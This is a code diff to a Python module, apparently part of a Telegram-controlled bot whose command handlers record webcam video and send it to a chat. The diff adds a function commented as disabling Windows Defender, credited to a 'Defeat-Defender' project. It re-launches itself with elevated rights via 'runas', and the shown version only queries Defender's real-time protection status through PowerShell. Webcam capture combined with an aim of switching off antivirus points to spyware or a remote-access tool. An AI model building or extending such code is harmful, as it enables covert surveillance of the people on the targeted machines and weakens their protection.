@@ -1,7 +1,4 @@
-import cv2
-import os
-import time
-
+import cv2, os, time, subprocess, sys, subprocess, ctypes
 
 # deze file bevat alle functies die aangeroepen worden wanneer een command uitgevoerd wordt
 
@@ -24,6 +21,7 @@ def get_banner() -> str:
 Viresh & Muazma
 =================================
 """
+
 
 # functie die een lijst met alle commands terug geeft
 def get_command_list() -> str:
@@ -92,3 +90,21 @@ def get_camRecording():
 
     # return de video/filepath zodat we hierna weten welke video naar de telegram chat verstuurd moet worden
     return filepath
+
+
+# windows defender uitzetten via python met powershell
+ASADMIN = "asadmin"
+def end_defender():
+    # Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
+    if sys.argv[-1] != ASADMIN:
+        script = os.path.abspath(sys.argv[0])
+        params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+        sys.exit(0)
+
+    completed = subprocess.run(
+        ["powershell", "-Command", "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"], 
+        capture_output=True, text=True
+    )
+    print(completed.stdout)
+    return completed
